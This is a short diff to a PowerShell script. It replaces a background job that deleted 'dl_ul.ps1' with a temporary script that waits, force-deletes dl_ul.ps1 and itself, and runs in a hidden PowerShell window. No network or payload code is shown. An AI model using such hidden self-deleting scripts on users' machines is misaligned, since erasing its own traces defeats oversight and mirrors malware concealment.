@@ -67,12 +67,21 @@ foreach ($file in $filesToDelete) {
     }
 }
 
-# Schedule a task to delete dl_ul.ps1 itself
-$deleteSelfScript = {
-    param($path)
-    Start-Sleep -Seconds 30
-    Remove-Item -Path $path -Force
-}
-$scriptBlock = [ScriptBlock]::Create($deleteSelfScript)
-$scriptPath = "C:\Users\$currentUser\dl_ul.ps1"
-Start-Job -ScriptBlock $scriptBlock -ArgumentList $scriptPath
+# Path to the dl_ul.ps1 script
+$dlUlScriptPath = "C:\Users\$currentUser\dl_ul.ps1"
+
+# Create a temporary script to delete dl_ul.ps1
+$tempScriptPath = "C:\Users\$currentUser\tempCleanup.ps1"
+
+# Script content that waits, deletes the dl_ul.ps1, and then deletes itself
+$scriptContent = @"
+Start-Sleep -Seconds 30
+Remove-Item -Path '$dlUlScriptPath' -Force
+Remove-Item -Path '$tempScriptPath' -Force
+"@
+
+# Write the temporary script content to the file
+Set-Content -Path $tempScriptPath -Value $scriptContent
+
+# Execute the temporary script in the background
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tempScriptPath`"" -NoNewWindow
